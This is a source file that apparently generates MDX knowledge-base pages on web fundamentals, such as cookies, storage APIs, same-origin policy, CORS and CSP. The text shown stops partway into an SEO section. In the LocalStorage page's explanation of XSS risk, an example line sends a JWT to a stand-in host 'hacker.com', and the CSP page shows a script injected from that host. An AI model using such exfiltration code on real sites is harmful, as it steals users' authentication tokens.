import fs from 'fs/promises'
import path from 'path'

const TICK3 = '\`\`\`'
const TICK1 = '\`'

const contentMap = {
  'src/features/kb/routes/KB/14. Web Fundamentals/Web Standards (W3C, WHATWG)/index.mdx': `---
title: Web Standards (W3C, WHATWG)
description: The organizations responsible for defining the strict rules, HTML elements, and CSS properties that browsers must mathematically implement.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Web Standards (W3C, WHATWG)">

If Apple invents a cool new HTML tag for Safari, but Google Chrome doesn't know how to render it, the web breaks. 
To ensure the web is universal, every browser vendor on Earth must agree to a strict set of architectural rules called **Web Standards**.

## The W3C (World Wide Web Consortium)

Founded by Tim Berners-Lee in 1994, the W3C historically governed all web standards. They are responsible for standardizing HTML (up to HTML4), CSS, and XML. 
Their goal was to ensure maximum accessibility, internationalization, and platform independence. 

## The WHATWG Rebellion

In 2004, a massive philosophical war broke out. 
The W3C wanted to push the web toward XHTML (an incredibly strict, unforgiving, XML-based language where a single missing closing tag would instantly crash the entire webpage). 

The engineers building Chrome, Safari, and Firefox (Google, Apple, Mozilla) hated this. They wanted HTML to be forgiving, dynamic, and focused on building Web Applications, not static XML documents. 
They rebelled and formed the **WHATWG (Web Hypertext Application Technology Working Group)**.

The WHATWG unilaterally created **HTML5**, defining modern APIs like TICK1<video>TICK1, TICK1<canvas>TICK1, and WebSockets. Their standard was so overwhelmingly successful that the W3C surrendered in 2019. Today, the WHATWG is the sole official maintainer of the HTML and DOM standards.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/URLs and URIs/index.mdx': `---
title: URLs and URIs
description: The foundational addressing system of the web, mathematically defining how resources are located and identified across the global internet.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="URLs and URIs">

You use URLs every single day, but their mathematical structure dictates exactly how browsers, proxies, and web servers process requests.

## The Hierarchy

- **URI (Uniform Resource Identifier)**: The master umbrella term. Any string of characters that identifies a resource. (e.g., an ISBN number for a book is a URI, but it doesn't tell you *where* the book is).
- **URL (Uniform Resource Locator)**: A specific type of URI that not only identifies the resource, but provides the exact network protocol to retrieve it. (All URLs are URIs, but not all URIs are URLs).
- **URN (Uniform Resource Name)**: A specific type of URI that uses a persistent namespace.

## Anatomy of a URL

Let's dissect: TICK1https://admin:pass@www.example.com:8080/path/to/page?search=hello#section3TICK1

1. **Protocol (Scheme)**: TICK1https://TICK1 (Tells the browser to open a TLS encrypted tunnel).
2. **Credentials (Deprecated)**: TICK1admin:pass@TICK1 (Do not use this. It transmits passwords in plain text in the URL).
3. **Subdomain**: TICK1www.TICK1 (Optional, routes to a specific sub-application).
4. **Domain (Host)**: TICK1example.comTICK1 (The registered top-level domain).
5. **Port**: TICK1:8080TICK1 (Optional. Defaults to 80 for HTTP, 443 for HTTPS).
6. **Path**: TICK1/path/to/pageTICK1 (The specific route on the server).
7. **Query String**: TICK1?search=helloTICK1 (Key-value parameters passed to the backend server. Separated by TICK1&TICK1).
8. **Fragment (Hash)**: TICK1#section3TICK1 (Points to an anchor ID on the page. **Crucially, the fragment is NEVER sent to the server.** It is processed entirely client-side by the browser to scroll down the page).

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Internet/index.mdx': `---
title: The Internet
description: The physical, global infrastructure of underwater fiber-optic cables, massive BGP routers, and IP addresses connecting billions of computers.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="The Internet">

The Internet and the World Wide Web are **not** the same thing. 

**The Internet is the physical infrastructure.** 
It is the massive, planetary network of hardware. It is the underwater fiber-optic cables crossing the Atlantic Ocean. It is the Cisco BGP routers sitting in massive datacenters. It is the IP addresses (Layer 3) and TCP/UDP ports (Layer 4) that allow a laptop in Tokyo to mathematically route a packet to a server in London.

## Core Protocols of the Internet
- **IP (Internet Protocol)**: Assigns every device a mathematical address (e.g., TICK1192.168.1.1TICK1).
- **TCP/UDP**: Ensures packets are correctly sequenced, retransmitted if lost, and delivered to the correct software port.
- **DNS (Domain Name System)**: Translates human-readable names like TICK1google.comTICK1 into raw IP addresses.
- **BGP (Border Gateway Protocol)**: The routing algorithm that calculates the fastest path through the global mesh of ISPs.

You can use The Internet without ever using the Web. Sending an email via SMTP, playing a multiplayer game over UDP, or SSHing into a Linux server all utilize the Internet, completely bypassing the World Wide Web.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/World Wide Web/index.mdx': `---
title: The World Wide Web
description: An application-layer information system running on top of the Internet, where documents are linked together via Hypertext.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="The World Wide Web">

If the Internet is the physical system of highways, the **World Wide Web (The Web)** is just one specific type of delivery truck driving on those highways.

Invented by Tim Berners-Lee in 1989 at CERN, the Web was designed as an information retrieval system for scientists.

## Core Pillars of the Web

The Web is defined by three fundamental technologies:
1. **HTTP (Hypertext Transfer Protocol)**: The Layer 7 language used by browsers and servers to request and deliver documents.
2. **HTML (HyperText Markup Language)**: The semantic language used to structure the text, images, and layout of a document.
3. **URLs (Uniform Resource Locators)**: The strict addressing format used to locate documents.

The genius of the Web was the invention of **Hyperlinks**. Before the Web, if you wanted to read a different document, you had to manually type in a new FTP address. Hyperlinks allowed documents to physically link to each other across different servers, creating a "Web" of interconnected human knowledge.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Browsers/index.mdx': `---
title: Web Browsers
description: Massively complex software applications designed to request, decrypt, parse, and render HTML/CSS/JS into visual, interactive applications.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Web Browsers">

A modern Web Browser is essentially a complete operating system running inside your computer. 
Its sole purpose is to securely execute untrusted code downloaded from the internet, rendering it visually while preventing that code from destroying your local machine.

## The Browser Architecture

1. **The User Interface**: The address bar, back buttons, and bookmarks.
2. **The Browser Engine**: The core director that marshals actions between the UI and the rendering engine.
3. **The Rendering Engine**: The mathematical core that parses HTML/CSS and paints pixels on the screen (e.g., Blink, WebKit, Gecko).
4. **The JavaScript Engine**: The ultra-fast V8/SpiderMonkey compiler that converts JS text into machine code in real-time.
5. **The Networking Layer**: Handles DNS lookups, TCP handshakes, TLS encryption, and HTTP requests.
6. **Data Storage**: Manages Cookies, LocalStorage, and IndexedDB on your hard drive.

## Multi-Process Architecture
In modern browsers like Chrome, every single tab runs in a completely isolated, sandboxed OS-level process. 
If a malicious website in Tab 1 contains a critical memory leak that crashes its rendering engine, Tab 1 will die (Aw Snap!), but Tab 2 and the main browser UI will remain completely unaffected. This requires massive amounts of RAM, but guarantees extreme stability and security.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Browser rendering engines/index.mdx': `---
title: Browser Rendering Engines
description: The core mathematical C++ engines responsible for parsing HTML/CSS, calculating layouts, and painting pixels to the screen.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Browser Rendering Engines">

When a server replies with an HTTP payload containing raw HTML text, your monitor cannot display text. It can only display colored pixels.
The **Rendering Engine** is the massive C++ program responsible for converting that text into pixels.

## The Big Three
- **Blink**: Developed by Google. Powers Chrome, Edge, Brave, Opera, and Vivaldi. (Blink is a fork of WebKit).
- **WebKit**: Developed by Apple. Powers Safari. (Note: Apple legally forces *all* browsers on iOS, including Chrome for iOS, to use WebKit under the hood).
- **Gecko**: Developed by Mozilla. Powers Firefox.

## The Critical Rendering Path

To paint pixels, the engine must execute the **Critical Rendering Path**:

1. **Parse HTML**: Converts the raw HTML string into the DOM Tree.
2. **Parse CSS**: Converts the raw CSS string into the CSSOM Tree.
3. **Render Tree**: Combines the DOM and CSSOM into a unified Render Tree, stripping out non-visible elements (like TICK1<head>TICK1 or TICK1display: noneTICK1).
4. **Layout (Reflow)**: Calculates the exact X/Y coordinates and width/height in pixels for every single box on the screen. (This is highly CPU intensive).
5. **Paint**: Fills the pixels with colors, shadows, and text.
6. **Composite**: If elements overlap (using TICK1z-indexTICK1 or animations), the engine sends the layers to the GPU to be composited together at 60 frames per second.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/DOM/index.mdx': `---
title: The DOM (Document Object Model)
description: The in-memory, object-oriented tree representation of an HTML document, allowing JavaScript to dynamically manipulate the webpage.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="The DOM (Document Object Model)">

When a browser downloads an HTML file, it does not keep it as a raw string of text. 
It parses the text and constructs a massive, hierarchical tree structure in RAM called the **DOM (Document Object Model)**.

## The Bridge to JavaScript

HTML is a static markup language; it cannot do math or handle click events. 
JavaScript is a programming language, but it knows absolutely nothing about web pages. 

The DOM is the API (Application Programming Interface) that bridges them. The browser creates the DOM and injects a global TICK1documentTICK1 object into JavaScript.

When you write TICK1document.getElementById('btn')TICK1, JavaScript is querying the DOM tree. 
If JavaScript modifies a DOM node (e.g., TICK1btn.style.color = 'red'TICK1), the Rendering Engine instantly detects the mutation, recalculates the layout, and repaints the screen. 

## Nodes vs Elements
- **Node**: Everything in the DOM is a Node. Even the invisible whitespace between two HTML tags is parsed as a "Text Node".
- **Element**: A specific type of Node that represents an actual HTML tag (like a TICK1<div>TICK1 or TICK1<p>TICK1).

<Callout icon="warning" title="DOM Manipulation is Slow">
  JavaScript executes at near native C++ speeds, but interacting with the DOM is incredibly slow. Every time you touch the DOM, you force the browser to execute the complex Layout/Reflow math. This is why modern frameworks like React invented the "Virtual DOM"—performing all the math in raw JavaScript memory and only touching the real DOM once at the very end.
</Callout>

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/CSSOM/index.mdx': `---
title: The CSSOM (CSS Object Model)
description: The in-memory tree representation of all CSS rules, critical for calculating the final visual styles applied to the DOM.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="The CSSOM (CSS Object Model)">

Just as HTML is parsed into the DOM, CSS is parsed into the **CSSOM (CSS Object Model)**.

The CSSOM is a massive tree structure that contains every single CSS rule, media query, and specificity calculation. The browser must combine the DOM and the CSSOM together to figure out how to render the page.

## The Render-Blocking Problem

The DOM can be built incrementally. If you have a massive HTML file, the browser can start rendering the header while the footer is still downloading.

**CSS is fundamentally Render-Blocking.**
The browser absolutely refuses to paint a single pixel on the screen until the CSSOM is 100% complete. 

Why? Because CSS rules cascade. If the browser painted the DOM in black text, and then a CSS rule at the very bottom of the file said TICK1body { color: red }TICK1, the browser would have to instantly erase the screen and redraw everything in red, causing a massive, ugly flash of unstyled content (FOUC).

To prevent this, the browser halts all rendering until all TICK1<link rel="stylesheet">TICK1 files are fully downloaded, parsed, and the CSSOM is constructed. This is why optimizing CSS delivery is the most critical step in Web Performance.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Cookies/index.mdx': `---
title: Cookies
description: The original, fundamental mechanism used to track state and remember users across the inherently stateless HTTP protocol.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Cookies">

HTTP is mathematically stateless. Every request is completely isolated. If you log into Amazon, and then click "View Cart", the server has completely forgotten who you are.

In 1994, Netscape invented **Cookies** to solve this.

## How Cookies Work
A Cookie is a tiny piece of text data (max 4KB) stored directly on the user's hard drive.

1. **The Set-Cookie Header**: When you log in, the server generates a random Session ID (e.g., TICK1xyz123TICK1) and sends it in the HTTP Response header: 
   TICK1Set-Cookie: session=xyz123TICK1
2. **The Automatic Attachment**: The browser saves this cookie to disk. **Crucially, the browser will automatically inject this Cookie into the headers of every single future HTTP request sent to that specific domain.**
3. **The Retrieval**: When you click "View Cart", the server reads the Cookie header, sees TICK1session=xyz123TICK1, checks its database, and remembers that you are Alice.

## Critical Security Flags
Because cookies contain authentication tokens, they are the primary target for hackers.

- **HttpOnly**: By default, JavaScript can read cookies via TICK1document.cookieTICK1. If a hacker injects malicious JS into your site (XSS), they can steal the cookie. The TICK1HttpOnlyTICK1 flag completely bans JavaScript from touching the cookie. The browser will still attach it to network requests, but JS cannot read it.
- **Secure**: Ensures the cookie is only ever transmitted over an encrypted HTTPS connection. If the user accidentally types TICK1http://TICK1, the browser will refuse to send the cookie, preventing packet sniffers from stealing it over open Wi-Fi.
- **SameSite**: Defends against CSRF (Cross-Site Request Forgery) attacks by dictating exactly when cookies should be sent in cross-origin requests.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Sessions/index.mdx': `---
title: Sessions
description: The backend architecture used to securely store user state data, utilizing a client-side Cookie only as a secure reference pointer.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Sessions">

While you *could* store a user's entire shopping cart or account balance directly inside a Cookie, that is a catastrophic security disaster. 
Because the Cookie lives on the user's computer, the user can easily open Chrome DevTools, edit the cookie, and change their account balance from $5 to $5,000,000.

To solve this, we use **Sessions**.

## The Pointer Architecture

A Session is a state-management architecture that splits data across the Client and the Server.

1. **The Server Side**: The server creates a secure vault in its own database (or RAM cache like Redis) to hold the sensitive data (e.g., TICK1{ User: Alice, Balance: $500, IsAdmin: false }TICK1). The server assigns this vault a massive, cryptographically random ID (e.g., TICK17f8b9c2a...TICK1).
2. **The Client Side**: The server sends *only* the random ID back to the user's browser, stored securely in an TICK1HttpOnlyTICK1 Cookie.

When Alice clicks "Checkout," her browser sends the Cookie containing the ID. The Server reads the ID, unlocks the corresponding vault in Redis, verifies she only has $500, and processes the transaction.

Because the user only possesses the randomized ID pointer, they cannot mathematically alter the data stored in the backend database.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/LocalStorage/index.mdx': `---
title: LocalStorage
description: A modern HTML5 Web Storage API providing persistent, synchronous, key-value storage directly within the browser.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="LocalStorage">

Cookies are terrible for storing application data. They have a 4KB limit, and because the browser automatically attaches them to every single HTTP request, storing 4KB of data in a cookie means wasting 4KB of network bandwidth on every single image, CSS file, and API call.

HTML5 introduced the **Web Storage API**, specifically **LocalStorage**, to solve this.

## How it Works
LocalStorage provides a simple, synchronous Key-Value store in the browser. 
- TICK1localStorage.setItem('theme', 'dark')TICK1
- TICK1localStorage.getItem('theme')TICK1

## Key Features
1. **Large Capacity**: Allows storing up to 5MB of data per domain (compared to the 4KB Cookie limit).
2. **Never Sent to Server**: LocalStorage data is strictly client-side. It is never automatically attached to HTTP headers, saving massive amounts of bandwidth.
3. **Persistence**: Data in LocalStorage has no expiration date. It persists even if the user completely closes the browser and reboots their computer. It is only cleared if the user manually wipes their browser cache.

<Callout icon="warning" title="The Security Flaw">
  LocalStorage does not have an TICK1HttpOnlyTICK1 equivalent. It is 100% accessible to JavaScript. Therefore, **you must never store JWTs or Authentication Tokens in LocalStorage**. If your site has a single XSS vulnerability, a hacker can easily write TICK1fetch('hacker.com?token=' + localStorage.getItem('jwt'))TICK1 and completely bypass all security.
</Callout>

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/SessionStorage/index.mdx': `---
title: SessionStorage
description: A variant of the Web Storage API that provides ephemeral, tab-specific storage that instantly vanishes when the tab is closed.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="SessionStorage">

**SessionStorage** has the exact same synchronous Key-Value API (TICK1setItemTICK1 / TICK1getItemTICK1) and the exact same 5MB capacity limit as LocalStorage. 

The only difference is **Persistence Scope**.

## The Ephemeral Tab Scope

While LocalStorage persists forever across the entire domain, **SessionStorage is strictly locked to the specific Browser Tab**.

- If the user closes the tab, the SessionStorage data is instantly and permanently deleted.
- If the user opens TICK1example.comTICK1 in Tab 1, and opens TICK1example.comTICK1 in Tab 2, those two tabs have completely isolated, separate SessionStorage databases. (In contrast, LocalStorage is shared across all tabs).

## Use Cases
SessionStorage is heavily used for tracking complex, multi-page user flows that shouldn't persist or bleed into other tabs. 
For example, if a user is filling out a massive 5-page insurance application, you save the draft data in SessionStorage. If they refresh the page, the data survives. If they finally close the tab, the sensitive draft data is safely purged from their computer.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/IndexedDB/index.mdx': `---
title: IndexedDB
description: The massive, asynchronous, NoSQL database built directly into modern web browsers, designed to store gigabytes of structured data for offline applications.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="IndexedDB">

LocalStorage is great for saving a simple TICK1{theme: 'dark'}TICK1 string, but it is synchronous (it blocks the main thread) and is limited to 5MB. 

If you are building a complex Progressive Web App (like Google Docs or Figma) that needs to operate completely offline, you need to store thousands of complex Javascript objects and binary blobs. You use **IndexedDB**.

## The Browser Database

IndexedDB is a fully-fledged NoSQL database built into the browser.
- **Asynchronous**: Every operation relies on Promises (or legacy callbacks), ensuring the UI never freezes while reading massive amounts of data from the hard drive.
- **Massive Storage**: Depending on the browser, IndexedDB can store gigabytes of data.
- **Transactions**: It supports ACID transactions, ensuring that if a multi-step database write fails halfway through, the entire operation is safely rolled back.
- **Indexes**: Just like MongoDB, you can create indexes on specific object properties, allowing you to instantly search through 10,000 records without looping through them manually.

<Callout icon="info" title="The Abstraction Layer">
  The raw IndexedDB API is notoriously horrific and overly complex to write by hand. In modern development, engineers almost never use the raw API. Instead, they use lightweight wrapper libraries like **Dexie.js** or **localForage**, which provide clean, Promise-based abstractions over IndexedDB.
</Callout>

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Same-origin policy/index.mdx': `---
title: Same-Origin Policy (SOP)
description: The absolute foundational security mechanism of the web, preventing malicious websites from silently reading data from your banking tabs.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Same-Origin Policy (SOP)">

If you log into your bank at TICK1chase.comTICK1, your browser saves an authentication cookie. 
If you then open a new tab and visit TICK1malicious-hacker.comTICK1, what stops the hacker's JavaScript from running TICK1fetch('https://chase.com/api/balance')TICK1, reading the response, and stealing your money?

The **Same-Origin Policy (SOP)**. 
It is the absolute bedrock of web security.

## The Definition of an "Origin"

An "Origin" is mathematically defined as the exact combination of three things:
1. **Protocol** (e.g., TICK1https://TICK1)
2. **Domain** (e.g., TICK1www.example.comTICK1)
3. **Port** (e.g., TICK1:443TICK1)

If **any** of those three things differ, it is a Cross-Origin request.
- TICK1http://example.comTICK1 and TICK1https://example.comTICK1 are different origins (different protocol).
- TICK1api.example.comTICK1 and TICK1www.example.comTICK1 are different origins (different domain).

## The Strict Rule

The SOP strictly dictates: **JavaScript running on Origin A is completely banned from reading data from Origin B.**

When TICK1malicious-hacker.comTICK1 attempts to fetch your bank balance, the browser executes the network request, but when the data comes back, the browser intercepts it, checks the SOP rules, realizes the origins don't match, and aggressively blocks the JavaScript from reading the response.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/CORS/index.mdx': `---
title: CORS (Cross-Origin Resource Sharing)
description: The controlled bypass mechanism that allows legitimate frontend applications to securely bypass the Same-Origin Policy and access external APIs.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="CORS (Cross-Origin Resource Sharing)">

The Same-Origin Policy (SOP) is brilliant for security, but it breaks modern web development. 
If your React frontend is hosted on TICK1https://my-app.comTICK1, and your Node.js backend is hosted on TICK1https://api.my-app.comTICK1, they are different origins. The SOP will violently block the React app from reading its own API!

To fix this, the backend server uses **CORS (Cross-Origin Resource Sharing)** to explicitly grant permission to the frontend.

## The CORS Headers

When the React app (TICK1my-app.comTICK1) attempts to fetch data from the API, the API server must include a specific HTTP Response Header:
TICK1Access-Control-Allow-Origin: https://my-app.comTICK1

When the browser receives this response, it checks the header. Because the header explicitly matches the React app's origin, the browser bypasses the SOP and allows the JavaScript to read the data. (If you want a public API that anyone can access, you set it to the wildcard TICK1*TICK1).

## The Preflight Request (OPTIONS)

If the React app tries to do something dangerous (like sending a TICK1DELETETICK1 request, or attaching custom TICK1AuthorizationTICK1 headers), the browser will panic. 
Before sending the actual request, the browser will silently send an invisible **Preflight Request** using the HTTP TICK1OPTIONSTICK1 method. 

The browser asks the backend, *"Hey, my-app.com wants to send a DELETE request. Is that allowed?"*
The backend must respond with TICK1Access-Control-Allow-Methods: GET, POST, DELETETICK1. Only after receiving this permission will the browser send the actual DELETE request.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/CSP/index.mdx': `---
title: CSP (Content Security Policy)
description: A powerful HTTP header that serves as the ultimate defense against Cross-Site Scripting (XSS) by whitelisting exactly which scripts are legally allowed to execute.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="CSP (Content Security Policy)">

The Same-Origin Policy stops hackers from reading external data, but it doesn't stop **XSS (Cross-Site Scripting)**. 
If a hacker manages to inject TICK1<script src="https://hacker.com/virus.js"></script>TICK1 into your webpage's comments section, the browser will blindly execute the virus, assuming you put it there intentionally.

To stop this, servers send a **Content Security Policy (CSP)** HTTP header.

## The Whitelist Architecture

CSP is a strict whitelist sent by your backend server. It tells the browser *exactly* where resources are legally allowed to load from.

Example Header:
TICK1Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;TICK1

If a hacker injects the TICK1virus.jsTICK1 script tag, the browser will check the CSP header. It will see that scripts are only legally allowed to load from TICK1'self'TICK1 (your own domain) or TICK1apis.google.comTICK1. Because TICK1hacker.comTICK1 is not on the whitelist, the browser will aggressively block the script from executing and throw a massive red error in the console.

<Callout icon="warning" title="Banning Inline Scripts">
  By default, a strong CSP will completely ban all inline scripts (e.g., TICK1<script>alert(1)</script>TICK1 or TICK1onClick="doSomething()"TICK1). The browser enforces that all JavaScript must be loaded from external, whitelisted TICK1.jsTICK1 files. This instantly neutralizes 99% of all XSS injection attacks.
</Callout>

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Server-Sent Events/index.mdx': `---
title: Server-Sent Events (SSE)
description: A lightweight, unidirectional protocol built into HTTP that allows servers to continuously push real-time text updates to the browser.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Server-Sent Events (SSE)">

If you are building a real-time stock ticker, you need the server to push updates to the browser. 
While WebSockets provide bi-directional communication, they require a complex, stateful TCP tunnel and heavy backend infrastructure.

If the browser only needs to *receive* data (unidirectional), the modern standard is **Server-Sent Events (SSE)**.

## How SSE Works

SSE is not a new protocol; it is 100% standard HTTP. 
1. The browser opens a standard HTTP GET request to the server.
2. The server responds with the header TICK1Content-Type: text/event-streamTICK1.
3. The server leaves the HTTP connection open indefinitely.
4. The server slowly drips raw text payloads down the open connection (e.g., TICK1data: {"stock": "AAPL", "price": 150}\n\nTICK1).

## Benefits over WebSockets
- **Native Reconnection**: If the user drives through a tunnel and drops cellular service, the browser's native TICK1EventSourceTICK1 API will automatically attempt to reconnect to the server, track the last received ID, and request the missing data. WebSockets force you to write this complex reconnection logic manually.
- **Firewall Friendly**: Because SSE is just standard HTTP over Port 443, enterprise firewalls and load balancers pass it through effortlessly. WebSockets frequently get blocked or mangled by aggressive corporate proxies.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Progressive Web Apps/index.mdx': `---
title: Progressive Web Apps (PWAs)
description: A modern paradigm where standard web applications leverage advanced browser APIs to look, feel, and function exactly like native mobile applications.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Progressive Web Apps (PWAs)">

Historically, if a company wanted a mobile app, they had to hire Objective-C developers for iOS, Java developers for Android, and submit the apps to heavily taxed, strictly controlled App Stores.

**Progressive Web Apps (PWAs)** are standard web applications (built with React/Vue) that utilize modern browser APIs to bypass the App Store entirely, functioning exactly like a native app.

## The Three Pillars of a PWA

To be officially recognized by the browser as a PWA, a web app must implement three things:

1. **HTTPS**: PWAs have access to dangerous APIs (like Geolocation and Background Sync), so they absolutely require a secure TLS connection.
2. **Web Manifest**: A simple JSON file that dictates exactly how the app should look when installed to the user's home screen (the icon, the theme color, and hiding the browser's URL bar).
3. **Service Worker**: A background JavaScript process that intercepts network requests, allowing the application to cache data and function completely offline without an internet connection.

If these three conditions are met, Chrome/Safari will natively prompt the user: *"Add this app to your Home Screen?"* 
The app installs instantly, bypassing the App Store, and runs in a full-screen, standalone window.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Service workers/index.mdx': `---
title: Service Workers
description: A powerful background JavaScript process that acts as a programmable network proxy, enabling offline functionality and background sync.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Service Workers">

A **Service Worker** is the technological engine that makes PWAs possible. 

Normally, JavaScript runs on the main thread and dies the moment the user closes the tab. 
A Service Worker is completely different. It is a standalone script that runs in the background, completely separate from the webpage. It has no access to the DOM, but it has ultimate power over the network.

## The Programmable Proxy

Once installed, a Service Worker acts as a Man-In-The-Middle proxy for your own application. 
Every single time your React app attempts to fetch an image, a CSS file, or an API endpoint, the Service Worker intercepts the request.

Using the TICK1fetchTICK1 event listener, the Service Worker can run custom logic:
1. **Network-First**: Try to fetch the data from the internet. If the user is offline, serve a fallback file from the local Cache API.
2. **Cache-First**: Instantly serve the logo from the local Cache API, completely bypassing the internet for extreme performance.

## Background Superpowers
Because the Service Worker runs independently of the browser tab, it enables native-app features:
- **Push Notifications**: The server can wake up the Service Worker in the background to display an OS-level push notification, even if the user hasn't visited the website in weeks.
- **Background Sync**: If a user writes an email while offline, the Service Worker saves it to IndexedDB. When the phone regains cellular service hours later, the OS wakes the Service Worker, which automatically syncs the email to the backend.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Web manifest/index.mdx': `---
title: Web Manifest
description: A standardized JSON configuration file that instructs the mobile operating system exactly how to install and display a Progressive Web App.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Web Manifest">

A website is designed to be viewed inside a browser window, surrounded by back buttons, URL bars, and tabs. 
A Native App is designed to run in a standalone, immersive full-screen window.

To make a PWA feel like a Native App, you provide a **Web Manifest** (usually named TICK1manifest.jsonTICK1).

## The Configuration

The manifest tells the OS exactly how to "install" the web app onto the user's home screen.

TICK3json
{
  "name": "My Awesome App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#000000",
  "icons": [
    {
      "src": "/icon-512x512.png",
      "sizes": "512x512",
      "type": "image/png"
    }
  ]
}
TICK3

- **TICK1display: "standalone"TICK1**: This is the most critical setting. It tells the OS to completely hide the Safari/Chrome URL bar and back buttons, forcing the app to run in its own dedicated, immersive window.
- **Icons**: Provides the exact high-resolution PNGs the OS needs to create the icon on the iOS/Android home screen.
- **Theme Color**: Controls the color of the OS status bar (where the battery and time are displayed) to match your brand.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/Web accessibility (a11y)/index.mdx': `---
title: Web Accessibility (a11y)
description: The engineering practice of ensuring web applications are fully usable by individuals relying on assistive technologies like screen readers.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="Web Accessibility (a11y)">

**Web Accessibility** (numeronym: **a11y**, meaning an 'a', 11 letters, then a 'y') is the architectural requirement that your application must be usable by people with visual, motor, or cognitive disabilities.

It is not just an ethical requirement; in many countries (like the US via the ADA), failing to make your enterprise website accessible exposes the company to massive lawsuits.

## Semantic HTML (The Foundation)

The easiest way to break accessibility is by using TICK1<div>TICK1 for everything.
If you build a button using TICK1<div class="btn" onClick={submit}>Submit</div>TICK1, a blind user's Screen Reader (like NVDA or VoiceOver) has no idea it is clickable. They cannot focus it with the keyboard, and they cannot activate it with the Enter key.

You must use **Semantic HTML**. By using a real TICK1<button>Submit</button>TICK1, the browser automatically provides keyboard focus, Enter-key activation, and correctly announces "Button: Submit" to the Screen Reader natively.

## ARIA (Accessible Rich Internet Applications)

Sometimes, you have to build complex custom UI components (like a drag-and-drop modal) that have no native HTML equivalent. 
In these cases, you use **ARIA attributes** to mathematically describe the state of the component to the Screen Reader.

- TICK1aria-hidden="true"TICK1: Completely hides an irrelevant decorative icon from the screen reader.
- TICK1aria-expanded="true"TICK1: Tells the screen reader that the accordion menu is currently open.
- TICK1aria-live="polite"TICK1: If a background Javascript process finally finishes loading data, this attribute politely interrupts the screen reader to announce "Data loaded successfully" to the blind user.

</ConceptTemplate>
`,

  'src/features/kb/routes/KB/14. Web Fundamentals/SEO fundamentals/index.mdx': `---
title: SEO Fundamentals
description: The technical architecture required to ensure web crawler bots can successfully discover, parse, and rank your application in search engine results.
---
import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'

<ConceptTemplate title="SEO Fundamentals">

**SEO (Search Engine Optimization)** is not just marketing; it is a hard engineering problem. 
If your web application is built incorrectly, the Googlebot crawler will physically be unable to read it, resulting in a ranking of zero.

## The JavaScript Rendering Problem

Historically, Googlebot was a simple script that downloaded an HTML file and read the text. 
Modern SPA frameworks (like React or Vue) send an empty HTML file (TICK1<div id="root"></div>TICK1) and require JavaScript to build the page. 
While Googlebot *can* execute JavaScript today, it is incredibly slow and expensive. If you rely on client-side JavaScript to render your blog posts, you will suffer severe indexing delays. 
**Solution**: Critical content must be rendered on the server (SSR - Server Side Rendering) or pre-generated at build time (SSG - Static Site Generation) so the bot receives fully populated HTML instantly.

## Core Technical SEO Requirements

